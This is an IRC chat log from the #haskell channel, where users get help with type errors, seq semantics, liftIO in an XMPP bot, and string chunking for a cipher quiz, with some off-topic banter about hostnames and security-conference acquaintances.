17:01:20 <OceanSpray> how do I get input for the ray tracer?
17:01:50 <OceanSpray> am I seriously supposed to just generate the scene in the program itself?
17:01:52 <ddarius> OceanSpray: For a simple one, I'd just write the stuff in the language (EDSL like essentially).
17:02:25 <int-e> OceanSpray: you'll probably need an ADT for describing the world anyway, you can start with some example scenes in the program and add a parser later.
17:02:36 <Cale> In fact, that does give you some cool opportunities to generate interesting scenes.
17:02:51 <ddarius> It's handy.
17:03:23 <OceanSpray> what's an ADT?
17:03:28 <Cale> One that I've used before and highly recommend trying is a set of 4 spheres of the same radius arranged so as to be touching in a way that their centres form a tetrahedron.
17:03:32 <int-e> 'algebraic data type'
17:03:34 <OceanSpray> oh
17:03:50 <int-e> data Foo = Alt1 | Alt2 some data | Alt3 | ...
17:04:26 <Cale> Put three lights just outside of three of the faces of that tetrahedron, and point the camera into the other.
17:05:02 <gnuvince_> The Haddock documentation for seq mentions that the value of seq a b is bottom if a is bottom.  What does that mean?
17:05:18 <mrd> > undefined `seq` 1
17:05:30 * mrd smacks lambdabot's _|_
17:05:36 <int-e> gnuvince_: think of 'undefined' or some error  for 'bottom'.
17:05:59 <mrd> gnuvince_: it means its strict on a
17:06:18 <int-e> with strictness annotations,  seq !a b = b.
17:06:31 <int-e> (that's cheating. strictness annotations are usually defined in terms of seq)
17:07:06 <int-e> equivalently, seq !a !b = b
17:07:59 <gnuvince_> Would it be accurate to say that seq returns b having evaluated a?
17:08:38 <Cale> The expression (seq a b), when evaluated, causes a to be evaluated before resulting in b
17:09:01 * gnuvince_ writes that down.
17:10:16 <int-e> Where, confusingly, 'before' does not necessarily imply a chronological order.
17:13:44 <sebell> int-e: Nor does it imply that it will be evaluated at all ;)
17:14:01 <Cale> sebell: It practically does though.
17:14:10 <Cale> sebell: Since the halting problem is unsolvable
17:14:24 <int-e> (The compiler can generate code that evaluates the second argument of seq immediately before evaluating the first one.)
17:14:50 <int-e> http://www.haskell.org/ghc/docs/latest/html/libraries/parallel/Control-Parallel.html <-- pseq is different.
17:24:43 <sneg__> hello i ve got the following code http://hpaste.org/6043?lines=true#a0
17:24:52 <sneg__> i cant compile it for a while now...
17:25:14 <sneg__> the problem seems to be with the line 13. It says this
17:25:46 <sneg__> Couldn't match expected type `[Char]' against inferred type `Maybe a'
17:25:55 <sneg__> i dont quite know what i should do in this case
17:26:13 <sebell> sneg__: If it's nothing, then you don't have str, do you?
17:26:24 <int-e> sneg__: str is a string due to the 'maybe "" id' above
17:26:50 <int-e> sneg__: just use  case getMessageBody msg of  ?
17:27:18 <sneg__> yes that makes sense... i will try that
17:28:14 <Cale> btw, it's probably not a great idea to name the pattern matched variable str, since it makes the code a little confusing to read
17:28:33 <sneg__> int-e: if i use your version is Just m -> a valid case for the case..of block?
17:28:37 <Cale> The str in the Nothing case must be the value Nothing
17:28:42 <int-e> sneg__: yes
17:29:18 <Cale> er, and yeah, str isn't even a Maybe value :)
17:29:27 <int-e> the   >> putStrLn str   is bogus :)
17:29:36 <Cale> heh, I'm doing the dual typechecking algorithm to the one int-e is using :)
17:29:52 <sneg__> now that i m here... is there a way to use a condition such as case of or if without specifying an alternative?
17:30:02 <Cale> sneg__: no.
17:30:03 <sneg__> I dont really want to do anything if its nothing
17:30:12 <Cale> sneg__: The expression must always be some value.
17:30:14 <int-e> if the messages have a Show instance,  putStrLn (show msg)  may be appropriate.
17:30:36 <Cale> sneg__: If you want that value to be the action which does nothing, something along the lines of  return ()  might be useful.
17:30:51 <Cale> (return () is a no-op action which always returns () when run)
17:31:27 <int-e> sneg__: you _can_ do that with case, but it won't have the result that you want (namely, do nothing). instead, it'll result in an error and probably abort your program.
17:31:32 <ddarius> "Click here for 80MB PNG file (10200x6000)"
17:31:52 <sneg__> return () will not iterrupt forever $ do, will it?
17:32:02 <Cale> ddarius: Lies! I clicked on your message and got nothing! :)
17:32:09 <int-e> sneg__: right, it won't.
17:35:01 <int-e> urg. s/putStrLn \(show msg\)/print msg/
17:35:06 <sneg__> i m sorry for asking these questions... I never used Haskell with IO, just for prototyping in the interpreter, so all of this new to me... the line str <- maybe "" id (...) what does it do?
17:35:15 <sneg__> i mean maybe "" implies maybe String
17:35:21 <sneg__> but whats "id" ?
17:35:31 <Cale> sneg__: That would have to be in the list monad...
17:35:46 <Cale> Since maybe "" id (...) is a list
17:35:49 <int-e> sneg__: eh, this one?  let str = maybe "" id (getMessageBody msg)
17:36:06 <sneg__> yea... a list... hm
17:36:23 <Cale> So you want  let str = maybe "" id (...)
17:36:27 <sneg__> its just complaining now that it wants IO() for printing and I m giving it XMPP ()
17:36:46 <Cale> (the list is not an action which you intend to run, so the v <- x syntax isn't appropriate)
17:37:01 <int-e> let str = ...    is (should be, it's a monad law) equivalent to   str <- return (...)
17:37:32 <Cale> It is, up to possible issues with polymorphism (that don't apply here)
17:38:06 <int-e> (uh. no, that doesn't work for recursive bindings. transforming  std <- return (...)  to  let str = ...   works, however)
17:39:05 <Cale> right
17:39:13 <int-e> sneg__: liftIO (putStrLn "foo")  may work.
17:39:21 <int-e> (depends on what XMPP is)
17:39:54 <sneg__> i have no clue... the function getMessageBody msg (judging from API) returns Maybe String
17:40:12 <sneg__> getMessageBody :: XMLElem -> Maybe String
17:40:19 <sneg__> and its saying something about XMPP
17:40:21 <int-e> sneg__: if you want better advise, load the module that defines XMPP in ghci and type :i XMPP, then paste the output somewhere.
17:40:33 <sneg__> okay
17:40:39 <int-e> *advice
17:41:28 <Cale> sneg__: If you haven't done much I/O in Haskell, I have a short document you might like to read
17:41:40 <Cale> http://haskell.org/haskellwiki/Introduction_to_IO
17:42:12 <sneg__> Cale: thanks. I will have a look at that. I also have a book. Dont know if its any good. Haskell - The Craft of Functional Programming (Simon Thompson)
17:42:53 <Cale> This is just a quick 2-minute intro :)
17:43:05 <sneg__> yea :) i m reading it now
17:43:32 <int-e> Do we have a two minute intro on monad transformers? *g*
17:44:02 <Cale> int-e: No, but it would be nice.
17:46:17 <int-e> sneg__: oh. I found  http://www.dtek.chalmers.se/~henoch/hsxmpp-doc/XMPP.html#1  -- is that what you're using?
17:46:28 <sneg__> yesh
17:46:50 <sneg__> i m doing this type :i XMPP thing now
17:46:52 <facedown> DO YOU SMELL WHAT THE ROCK IS COOKIN?
17:46:53 <SamB> man, the RELAX NG spec looks SOOO much like a typesystem-related paper...
17:46:56 <sneg__> its refusing :)
17:47:13 <Cale> facedown: Wrong channel?
17:47:16 <int-e> note that XMPP is an instance of  MonadIO  -- MonadIO defines a function  liftIO :: IO a -> m a  where m is the monad in question, XMPP in your case.
17:47:32 <facedown> Cale: no
17:47:47 <sneg__> so I can use liftIO ( print msg ) ?
17:47:52 <int-e> yep
17:47:58 <int-e> and same for putStr*
17:47:58 <Cale> facedown: Have a Haskell question? :)
17:48:20 <facedown> Cale: do you?
17:48:47 <Cale> facedown: This channel is for discussion at least vaguely related to Haskell.
17:49:00 <facedown> ok
17:49:20 <Cale> (Which is a purely functional programming language.)
17:52:19 <cjb> hm, I need an FP-esque hostname for a new machine :) I like five-letter hosts, already have monad, unity and curry.
17:52:42 <davidL> is lambdabot not working in PMs?
17:52:58 <cjb> > test
17:53:07 <davidL> @bot
17:53:08 <cjb> davidL: usually when it's not working in PMs, it's not working at all.
17:53:15 <davidL> oh :(
17:53:16 <Cale> hmm
17:53:41 <int-e> cjb: arrow?
17:53:47 <cjb> int-e: ooh, nice
17:54:02 <davidL> cjb: that's a cool naming scheme
17:54:09 <davidL> @bot
17:54:09 <int-e> cjb: idiom is another related candidate, but those got renamed to applicative :)
17:54:14 <lambdabot> :)
17:54:28 <cjb> but then people are going to ask me what arrows are, and I'm gonna say "well they're like monads but I'm scared of category theory so I don't know quite how" :)
17:54:30 <davidL> did LB lose any state while when it left?
17:54:31 <glen_quagmire> how can I get val from (Eval val)  where Eval is some monad probably
17:54:41 <davidL> s/while//
17:54:58 <Cale> glen_quagmire: The monad probably comes with a way to run it.
17:55:10 <sneg__> int-e: can i simply do liftIO ( m ) ?
17:55:16 <sneg__> where m is XMPP
17:55:21 <glen_quagmire> oh then i could use <-
17:55:34 <int-e> sneg__: no that's going into the wrong direction.
17:55:48 <Cale> sneg__: You usually apply liftIO to IO actions in order to turn them into other things.
17:55:57 <int-e> sneg__: you can, inside XMPP, do  liftIO ( io )  where io is an IO action.
17:56:11 <dbpatterson> is it normal to burn through 1.2ish gigs of memory on an infinite recursive loop in under a few seconds?
17:56:38 <Cale> dbpatterson: That's a little excessive, but not so surprising.
17:56:50 <int-e> cjb: how about a foldr ?
17:57:09 <cjb> int-e: :)
18:02:14 <ddarius> apply
18:02:36 <BMeph> first
18:02:44 <shapr> second!
18:02:50 <BMeph> bzzt!
18:02:54 <int-e> redex
18:02:57 <shapr> Thank you for playing!
18:03:02 <sneg__> this is my new version . http://hpaste.org/6044?lines=true. Now its not happy about line 10
18:03:11 <int-e> oh, 'false' :P
18:03:17 <newsham> an arrow transforms an input to an output possibly with state/side effects
18:03:23 <newsham> should be a fairly familiar concept :)
18:03:23 <BMeph> Five letters, shapr
18:03:31 <shapr> What did I miss?
18:03:40 <newsham> also hi cjb
18:04:00 <sneg__> expects type `String -> IO t', against inferred `IO String'
18:04:44 <sneg__> it expects a method and i m giving it IO String?
18:04:55 <BMeph> shapr: [17:52]	<cjb>	hm, I need an FP-esque hostname for a new machine :) I like five-letter hosts, already have monad, unity and curry.
18:05:02 <shapr> aha
18:05:22 <davidL> mzero
18:05:27 <wli> lambda
18:05:34 <BMeph> bzzt!
18:05:35 <wli> mzero is better
18:05:52 <BMeph> Yes, then the next one can be mplus! :)
18:06:03 <davidL> Maybe
18:06:08 <BMeph> mapM_
18:06:34 <int-e> sneg__: liftIO (mapM_ print r)
18:06:43 <davidL> recip
18:07:10 <sneg__> int-e: r <- liftIO ( evalRequest cfg m )
18:07:15 <hpaste>  int-e annotated "(no title)" with "alternatively, lift a whole block" at http://hpaste.org/6044#a1
18:07:16 <sneg__> its this line its not happy about
18:07:16 <shapr> cjb: jones? :-)
18:07:44 <BMeph> (***)
18:07:53 <int-e> sneg__: oh
18:08:01 <int-e> what type does   evalRequest cfg m   have?
18:08:08 <BMeph> (->)r
18:08:23 <shapr> redex is pretty good.
18:08:42 <Cale> thunk
18:09:02 <shapr> ooh
18:09:04 <davidL> I like thunk
18:09:12 <int-e> (ignore my annotation then. I assumed that  evalRequest cfg m  is in IO)
18:09:14 <shapr> Very seussish.
18:09:15 <newsham> closure
18:09:21 <shapr> That's not five letters!
18:09:28 <int-e> one thunk, two thunk, red thunk, blue thunk?
18:09:28 <newsham> oh 5 letters?
18:09:45 <shapr> Yeah, five letters, FP-ish word.
18:09:46 <Cale> green eggs and thunk?
18:09:50 <sneg__> int-e: i think its evaluator :: IO (String -> Bool -> IO EvaluationResult)
18:09:54 <newsham> curry?
18:10:02 <davidL> fixity :(
18:10:04 <ddarius> apply (if it was dropped earlier)
18:10:12 <shapr> newsham: He's already got curry monad and unity
18:10:13 <sebell> shapr: apply
18:10:18 <sneg__> or more likely: evaluate :: CompileConfig -> String -> Bool -> IO EvaluationResult
18:10:20 <shapr> Oh that's nice
18:10:28 <newsham> liftm?
18:10:40 <newsham> foldr?
18:10:59 <shapr> Suggestions so far are redex thunk apply liftm mzero first foldr mplus jones
18:11:34 <davidL> const!
18:11:38 <newsham> total? :)
18:11:53 <sneg__> nah that cant be right... too many arguments and it doesnt return string
18:11:59 <shapr> By now, cjb has probably already chosen something and gone on with life...
18:12:02 <ddarius> shift reset
18:12:05 <int-e> sneg__: uh, any reason why it's not  String -> Bool -> IO EvaluationResult?
18:12:08 <sebell> shapr: Do we have recur yet?
18:12:39 <sneg__> int-e... no there no reason for that... i m just confused: )
18:12:42 <shapr> cjb: Got something already? Should I stop thinking now?
18:13:00 <newsham> calcc? ;-)
18:13:11 <shapr> heh
18:13:17 <sneg__> int-e: evalRequest <- Request.evaluator so it isnt accessed directly
18:13:30 <int-e> sneg__: ah.
18:13:32 <sneg__> the Request.evaluator function is confusing... i m going to paste it to you
18:13:36 <newsham> shapr is a 5 letter word relating to fp
18:13:42 <int-e> sneg__: ok, that should actually work then, hmm.
18:13:44 <shapr> haha
18:14:17 <shapr> newsham: That could get confusing since cjb and I live in the same city and might meet up at times.
18:14:36 <newsham> ycomb
18:14:50 <int-e> simon!
18:14:55 <ddarius> "shapr crashed here today"
18:14:59 <shapr> haha
18:15:00 <sneg__> int-e: http://hpaste.org/6044#a2 <- here is Request.evaluator
18:15:04 <newsham> ocaml
18:15:13 <ddarius> scheme
18:15:16 <ddarius> Ack
18:15:16 <newsham> ddarius: did you get it in a debuger?
18:15:18 <davidL> tuple
18:15:32 <gnuvince_> src reverse
18:15:33 <gnuvince_> @src reverse
18:15:34 <lambdabot> reverse = foldl (flip (:)) []
18:16:00 <ddarius> newsham: A whole new meaning on "core dump"
18:16:00 <int-e> sneg__: IO (String -> IO String) ... the result only wants one argument, not two.
18:16:16 <int-e> sneg__: try  liftIO (evalRequest m)
18:16:55 <shapr> I wish I weren't sick, lots of cool people in Boston.
18:17:10 <sneg__> int-e: so when I call evalRequest i am calling Request.evaluator. is that it?
18:17:18 <newsham> i just got back from southbay
18:17:30 <shapr> Southbay?
18:17:47 <shapr> SF? LA?
18:17:51 <newsham> sf bay area, silicon valley area
18:17:56 <shapr> Ah
18:18:06 <sneg__> int-e: i mean in the code i was given, evalRequest <- Request.evaluator , so I assumed that function just returns a different method
18:18:08 <shapr> When will you next be in Boston?
18:18:16 <int-e> sneg__: no. when you say   evalRequest <- evaluator,  evalRequest will be bound to a function of type  String -> IO String -- namely the  \s -> ...  stuff   after the   return $  in evaluator.
18:18:25 <sneg__> oohhh.
18:18:26 <newsham> last time was prob 2002/2003, next time will probably be about as soon :)
18:18:37 <shapr> Oh well
18:18:47 <shapr> I was thinking you might come to SOURCE.
18:18:54 <newsham> i live in hawaii, its a bit of a trek to get to bahhston
18:18:58 <shapr> oh
18:19:17 <Adamant> I wish I could go to SOURCE
18:19:20 <newsham> what's source?
18:19:34 <Adamant> new con, will have a L0pht reunion and lots of other stuff
18:19:43 <sneg__> int-e. oh yes! you are right
18:19:47 <shapr> I know some people going, but it's too expensive for me.
18:19:55 <newsham> i had drinks w/ mudge last week in palo alto
18:20:16 <newsham> havent seen other l0pht guys in at least a few years
18:20:42 <shapr> grr, must add DontZap
18:20:53 <shapr> Anyway, I'd rather go to the Edward Tufte workshop two days from now.
18:21:53 <shapr> Adamant: I accidentally met the author of netcat two weeks ago, that was cool :-) Speaking of the l0pht
18:22:13 <Adamant> Hobbit? he's still around? awesome
18:22:35 <sebell> shapr: Very cool! Gotta love nc
18:22:36 <newsham> i havent seen hobbit since @stake
18:23:05 <newsham> i heard he modded his prius to be a lot more efficient
18:23:20 <shapr> Yeah, he introduced himself as Hobbit and I said "Oh, you know there's another Hobbit who used to do security." he said "That's probably me."
18:23:36 <shapr> I was amused. He seemed amazed that anybody remembered.
18:23:36 <newsham> :)
18:24:11 <sneg__> int-e: thank you very much for helping me. i will try and do this on my own now : )
18:24:13 <newsham> http://www.jargon.net/jargonfile/h/hobbit.html
18:24:13 <lambdabot> Title: jargon, node: hobbit
18:24:24 <int-e> sneg__: good luck
18:24:27 <newsham> hobbit the master of lasers
18:24:56 <biouser> closedKnights :: Int Int Int Int -> [[Hyper]]
18:24:56 <biouser> closedKnights n m o p= [pos:path | (pos, path) <- tour (n*m*o*p), pos == start]
18:24:56 <shapr> He's doing lighting these days as well.
18:25:00 <newsham> how many people do you know who are in the hackers dictionary of compuer jargon?
18:25:02 <shapr> Anyway... off-topic
18:25:11 * shapr moves this to #haskell-blah
18:25:58 <biouser> how do I have a four Int input?
18:26:29 <int-e> biouser: Int -> Int -> Int -> Int ->  [[Hyper]]
18:27:08 <biouser> hmm, thanks. let me play with that for a while...
18:27:13 <int-e> biouser: oh, and  tour (n*m*o*p)  is meant to pass 4 arguments?
18:27:22 <int-e> tour n m o p  does that.
18:28:23 <biouser> not sure, I am just trying to expand nxn knight' tour program to nxmxoxp where I already successfully have nxnxnxn
18:29:03 <biouser> tour is not a function to pass arguments to that I know of
18:31:23 <int-e> I was making an assumption, which was possibly wrong. does the program continue with a where clause that defines 'tour'? Then (n*m*o*p) would make sense.
18:37:22 <shapr> bobmoretti: How's code?
18:37:54 <cjb> shapr: hey hey
18:37:58 <shapr> y0 y0
18:38:03 <cjb> shapr: daf is around Boston now, so one more person for a CHUG.
18:38:07 <shapr> ooh!
18:38:10 <shapr> For how long?
18:38:33 <shapr> cjb: Oh, I talked to Fare about merging the Boston Area Lisp group with a CHUG, but he wasn't that interested.
18:40:35 <jfredett> when is chug going to be, anyway?
18:40:43 <shapr> I don't know...
18:41:09 <jfredett> lol, no worries. is there a mailinglist yet?
18:41:14 <shapr> Not yet...
18:41:17 <jfredett> ...
18:41:21 <jfredett> website?
18:41:22 <jfredett> :P
18:41:26 <jfredett> wikipage, even?
18:41:26 <shapr> And I don't want to create one right away because I'm about to change hosting providers.
18:41:30 <shapr> Er, no?
18:41:36 <shapr> I can create a wikipage :-)
18:41:43 <jfredett> heh, that would be good-
18:42:04 <jfredett> do the wikipages have RSS feedS?
18:42:09 <jfredett> s/S/s/
18:43:14 <shapr> I don't know. Haskellwiki is a mediawiki installation.
18:43:35 <jfredett> hrm
18:45:10 <shapr> Hi mae
18:45:26 <mae> hye there
18:45:27 <mae> heh
18:45:29 <shapr> How's code?
18:45:44 <mae> hehe, its fine
18:47:46 <hpaste>  mae pasted "where did i go wrong?" at http://hpaste.org/6045
18:48:06 <wli> GSL.plot rocks my world.
18:48:08 <mae> if someone could take a look ; )
18:48:13 <EvilTerran> mae, the syntax for tuples has ,s between items
18:48:25 <mae> oh damn
18:48:32 <mae> what an idiot i am
18:48:37 <EvilTerran> case (splitAt 5 "warglebarglifarg") of (first, rest) -> first
18:48:45 <EvilTerran> > case (splitAt 5 "warglebarglifarg") of (first, rest) -> first
18:48:49 <lambdabot>  "wargl"
18:49:03 <mae> thank you
18:49:06 <EvilTerran> mae, also, you may appreciate the functions "take" and "drop"
18:49:06 <mae> i'm doing the solitaire cipher
18:49:07 <mae> heh
18:49:10 <mae> haskell quiz
18:49:15 * wli was born in 1976
18:49:16 <mae> yeah i looked at that
18:49:22 <mae> i'm trying to split it into groups of 5
18:49:23 <EvilTerran> > take 5 "myheadasplode"
18:49:23 <lambdabot>  "myhea"
18:49:29 <facedown> > wug
18:49:30 <lambdabot>   Not in scope: `wug'
18:49:34 <facedown> > self
18:49:35 <lambdabot>   Not in scope: `self'
18:49:39 <EvilTerran> > it
18:49:39 <facedown> > 5+3
18:49:40 <lambdabot>   Not in scope: `it'
18:49:40 <lambdabot>  8
18:49:54 <facedown> what interpreter is that?
18:49:55 <EvilTerran> @yhjulwwiefzojcbxybbruweejw
18:49:55 <lambdabot> "\"\\\"\\\\\\\"\\\\\\\\\\\\\\\"\\\\\\\\\\"
18:50:05 <EvilTerran> facedown, a haskell one, surprisingly
18:50:08 <facedown> ..
18:50:11 <facedown> specifically
18:50:14 <facedown> come on man
18:50:21 <int-e> it's called runplugs
18:50:36 <EvilTerran> @version
18:50:36 <lambdabot> lambdabot 4p597, GHC 6.8.2 (Linux i686 2.40GHz)
18:50:36 <lambdabot> darcs get http://code.haskell.org/lambdabot
18:50:37 <facedown> ah
18:50:41 <int-e> look at the lambdabot sources for details.
18:50:57 <EvilTerran> > __FILE__
18:50:58 <lambdabot>   Not in scope: `__FILE__'
18:51:00 <EvilTerran> bah
18:51:06 <facedown> > one=2; one
18:51:06 <lambdabot>  Parse error at "=2;" (column 4)
18:51:11 <EvilTerran> no cpp. that's probably a good thing.
18:51:20 <int-e> > let one = 2 in one
18:51:21 <lambdabot>  2
18:51:25 <EvilTerran> facedown, it evaluates expressions only
18:51:46 <facedown> EvilTerran: assigning a variable and doing something with it = expression?
18:51:50 <int-e> > let _ + _ = 42 in 23 + 666
18:51:51 <lambdabot>  42
18:51:58 <EvilTerran> you don't "assign variables" in haskell, though
18:52:07 <EvilTerran> you can bind a name to a value
18:52:13 <facedown> oh
18:52:15 <EvilTerran> globally, in source files, or locally in expressions
18:52:27 <EvilTerran> locally, you have to use the let/in construct
18:52:33 <facedown> > let one = 1; one+2;
18:52:34 <lambdabot>  Parse error at ";" (column 19)
18:52:38 <EvilTerran> or something equivalent
18:52:41 <facedown> >let one =1+2
18:52:48 <facedown> >let one=1+2, one
18:52:49 <EvilTerran> let has to have an in
18:52:55 <int-e> @quote slowly
18:52:55 <lambdabot> cjs says: I have to explain this shit to people. I mean, I start out right, "Hey, you know how you always have these bugs because what you thought was in the variable is not there?" And I get all of
18:52:55 <lambdabot> these nods of agreement. "Well, I've found a new language that solves that problem." Audience: "Ooooh! How?" Me: "There's no variables!" And then they all start moving away from me slowly....
18:52:57 <EvilTerran> and > has to have a space after it
18:53:28 <facedown> > let one = 1 :: one+1
18:53:28 <lambdabot>  Parse error at "+1" (column 19)
18:53:42 <facedown> > let one = 1\n one+1
18:53:42 <lambdabot>  Parse error at "\n" (column 12)
18:53:47 <cjb> shapr: I can give you a mailing list, but printf.net probably isn't an appropriate domain for it :)
18:53:51 <EvilTerran> facedown, a "let" has to have a value, just like any other expression. that value comes after the "in"
18:53:51 <mae> any better way to do this ? ['X' | _ <- [1..xs]
18:53:54 <shapr> hah
18:53:58 <mae> terr
18:53:58 <mae> err
18:53:59 <mae> this
18:54:02 <EvilTerran> mae, replicate
18:54:03 <facedown> EvilTerran: correct me? ;p
18:54:05 <mae> ['X' | _ <- [1..n]]
18:54:09 <mae> k
18:54:11 <facedown> EvilTerran: my expression that is
18:54:12 <int-e> mae: replicate n 'X'
18:54:33 <mae> you rock
18:54:35 <mae> heh
18:54:36 <EvilTerran> facedown, [:53] <int-e> > let one = 2 in one
18:54:38 <ddarius> But a let doesn't have to have any bindings...
18:54:43 <int-e> > [1..42] >>= "X"
18:54:44 <lambdabot>  Couldn't match expected type `t -> [b]'
18:54:48 <int-e> > [1..42] >> "X"
18:54:49 <EvilTerran> ddarius, now you're just obfoscating
18:54:50 <lambdabot>  "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
18:54:59 <EvilTerran> er, obfuscating
18:55:18 <EvilTerran> i mean, you wouldn't have a let if it didn't have any bindings
18:55:36 <ddarius> > let in 3
18:55:37 <lambdabot>  3
18:55:51 <int-e> > do let one = 2; one -- sorry
18:55:51 <lambdabot>  Parse error at end of input
18:56:02 <int-e> > do let { one = 2 }; one
18:56:02 <lambdabot>   add an instance declaration for (Num (t t1))
18:56:13 <int-e> aww.
18:56:15 <ddarius> Hmm
18:56:17 <EvilTerran> altho i guess the maximal munch could be useful for eliminating brackets to the RHS of an operator of high precedence
18:56:21 <ddarius> > do let; [a]
18:56:21 <lambdabot>  Parse error at end of input
18:56:26 <EvilTerran> int-e, do blocks have to return a monadic value
18:56:30 <EvilTerran> > do let {}; [1]
18:56:31 <lambdabot>  [1]
18:56:52 <int-e> EvilTerran: not in ghc 6.9
18:57:10 <EvilTerran> er
18:57:15 <EvilTerran> how queer
18:57:23 * wli was never impressed by the late 1970's and early 1980's microcomputers.
18:57:27 <EvilTerran> but regardless, [:52] <lambdabot> lambdabot 4p597, GHC 6.8.2 (Linux i686 2.40GHz)
18:57:47 <int-e> EvilTerran: not really, it just respects the desugaring. - does the haskell report say anything about the types of a  do  block?
18:58:01 <EvilTerran> ?type (>>=) -- it says this
18:58:01 <int-e> (I should just check myself ... *wanders off*)
18:58:08 <lambdabot> forall (m :: * -> *) a b. (Monad m) => m a -> (a -> m b) -> m b
18:58:17 <EvilTerran> it also lays down some equivalences that must be obeyed
18:58:28 <EvilTerran> but you may be able to weasel your way out of it
18:58:40 <int-e> @undo do let { one = 2 }; one
18:58:40 <lambdabot> let { one = 2} in one
18:58:47 <int-e> EvilTerran: no >>=
18:58:51 <EvilTerran> i know
18:58:59 <EvilTerran> as i said, it lays down some equivalences
18:59:13 <EvilTerran> at least one of those allows for introductions of >>=s in monadic expressions
18:59:47 <EvilTerran> but it does so in a different place from where it introduces do-notation. so, as i said, you may be able to weasel
19:00:58 <hpaste>  mae pasted "here is what i have so far, bwa ha ha" at http://hpaste.org/6046
19:01:12 <mae> http://www.rubyquiz.com/quiz1.html
19:01:12 <lambdabot> Title: Ruby Quiz - The Solitaire Cipher (#1)
19:02:44 <EvilTerran> mae, well, you shouldn't need to qualify Char.toUpper - you haven't imported Char qualified, so toUpper shoulw be fine
19:02:59 <mae> ahh ok
19:03:01 <mae> good tip ; )
19:03:07 <mae> i could also just compose that on the fly i suppose too
19:03:34 <mae> encrypt = prepare . clean . map toUpper
19:03:41 <EvilTerran> the alternative import style is "import qualified Data.Map", or "import qualified Text.ParserCombinator.Parsec as P" if you want to give it a shorter name
19:04:03 <mae> ok ; )
19:04:06 <mae> which do you reccomend
19:04:10 <mae> recommend *
19:04:11 <EvilTerran> in which case you *have* to use the imported functions qualified, which is helpful if you have a name clash
19:04:31 <int-e> EvilTerran: I can see both sides of that argument. And I wouldn't dream of using  do  for nonmonadic code in production.
19:04:33 <EvilTerran> some modules have lots of name clashes with stuff like the Prelude or Data.List, so those're intended to be imported qualified
19:04:56 <mae> ic
19:04:56 <EvilTerran> int-e, indeed, your second point is what tips the balance for me. there's no need for it.
19:05:12 <EvilTerran> mae, but, if that's not the case, it's generally much nicer to not bother with qualified imports
19:05:41 <mae> ok ; )
19:06:30 <mae> thanks for the tips, i always try to focus on elegance ; )
19:06:38 <mae> see any better way of doing the encrypt function?
19:06:51 <mae>  i couldn't think of a nice way to do it, because of the weird X's at the end
19:07:09 <mae> sorry i meant prepare
19:07:11 <mae> not encrypt
19:08:46 <EvilTerran> take 5 (first ++ repeat 'X')?
19:09:50 <mae> ahh, that is better, then i don't need the case i guess
19:10:09 <mae> but i am concatenating when i don't need to
19:10:38 <mae> but that does give me an idea
19:10:58 <int-e> > let split n = unfoldr (\xs -> guard (not (null xs)) >> return (splitAt n xs)); prepare = init . split 5 . (++"XXXXX") in map prepare ["", "abcdefg", "abcdefghi"]
19:10:59 <lambdabot>  [[],["abcde","fgXXX"],["abcde","fghiX"]]
19:11:23 <wli> Cryptanalysis is much more interesting than cryptography. Try even a Caesar cipher.
19:11:39 <mae> heh
19:12:44 * BMeph prefers his Caesar ciphers with extra parmesan
19:12:54 <mae> heh what int-e
19:12:56 <mae> err
19:12:56 <mae> wow
19:13:06 <mae> talk about the clever end of the spectrum
19:13:13 <mae> not too readable though ; )
19:13:19 <mae> imo of course
19:13:57 <int-e> that 'split' function is an FAQ (there's a nicer name for it, I forgot.)
19:14:19 <BMeph> int-e: "chunk"
19:14:42 <int-e> or chunks. right. thanks.
19:14:54 <BMeph> Which isn't particularly "nice"-sounding, at least to my ear. ;)
19:15:06 <mae> ok so where is this faq?!?!
19:15:18 <dolio> @faq Where is the faq?
19:15:18 <lambdabot> The answer is: Yes! Haskell can do that.
19:15:23 <BMeph> Whenever I hear "chunk," I always think "blow"... ;)
19:15:29 * wli wonders if he was the one who named it "chunk"
19:15:46 <mae> heh
19:15:57 <mae> @faq chunk
19:15:57 <lambdabot> The answer is: Yes! Haskell can do that.
19:16:00 <mae> damn
19:16:03 <mae> bastard
19:16:28 <EvilTerran> int-e, the difference is the appended extra characters, tho
19:16:47 <bltrout> @src chunk
19:16:47 <lambdabot> Source not found. My pet ferret can type better than you!
19:17:09 <int-e> > let chunks n = map (take n) . takeWhile (not . null) . iterate (drop n); prepare = init . chunks 5 . (++ "XXXXX") in map prepare ["", "abcdefg", "abcdefghi"] -- better?
19:17:10 <lambdabot>  [[],["abcde","fgXXX"],["abcde","fghiX"]]
19:17:32 <int-e> EvilTerran: the 'prepare' adds extra characters and drops the last (usually partial) chunk.
19:17:40 <EvilTerran> so i see
19:18:08 <mae> heh
19:18:20 <mae> that sure seems like a lot of wrasslin
19:18:57 <int-e> you can even inline the  chunks 5  now ;)
19:19:21 <int-e> It won't make the code more readable though, but it becomes a bretty . . . pipeline.
19:19:27 <int-e> *pretty
19:19:32 <mae> lol
19:20:00 <mae> my brain is slowly becoming more accustomed to haskell
19:20:14 <mae> in ruby i would just string together the string munging functions real fast
19:20:21 <mae> in haskell i have to think about what is going on
19:20:52 <mae> what i mean to say is
19:20:58 <mae> "i am not thinking in haskell"
19:21:13 <EvilTerran> you'll get there. i struggle to think imperatively now
19:21:34 <int-e> #haskell is a good place to learn about the Haskell zoo of list functions *g*
19:21:43 <mae> yay
19:21:45 <mae> thats what i'm all about
19:21:48 <EvilTerran> well, compared to thinking lazy-functionally. i think i'm no worse (if anything, better) at thinking imperatively than before ilearnt haskell
19:21:49 <mae> ruby-lang used to be like that
19:21:58 <mae> but now its filled with dolts (#ruby-lang that is_
19:22:03 <EvilTerran> but i find lazy functional thinking to just be so much *easier*
19:24:07 <EvilTerran> for the last project i had to do in java, i broke one of the marker's brains by making a load of pure data structure classes
19:24:47 <int-e> sell them as "immutable objects"
19:25:24 <EvilTerran> "and what's this Delay<T> thing about?"
19:25:47 <EvilTerran> "er... laziness?" **head asplode**
19:25:57 <int-e> uhm. on demand evaluation
19:26:17 <SamB> EvilTerran: he didn't say "What!!!! I won't take no laziness from the likes of you!!!!"?
19:26:30 <int-e> (ignore the caching part. it'll dawn on them later.)
19:27:12 <int-e> did you build infinite lists? :)
19:27:15 <SamB> hey... what's a marker?
19:27:33 <allbery_b> grader
19:27:39 <SamB> mae: reminds me of #python
19:27:48 <SamB> except I can't tell if it's myself or the channel that changed
19:28:34 <EvilTerran> allbery_b, nah, it's more that all the lab's sharpies are possessed and self-aware
19:28:49 <EvilTerran> that also goes some way to explain why i can never find one when i want it...
19:31:30 <SamB> heavy mutation has always been confusing to me
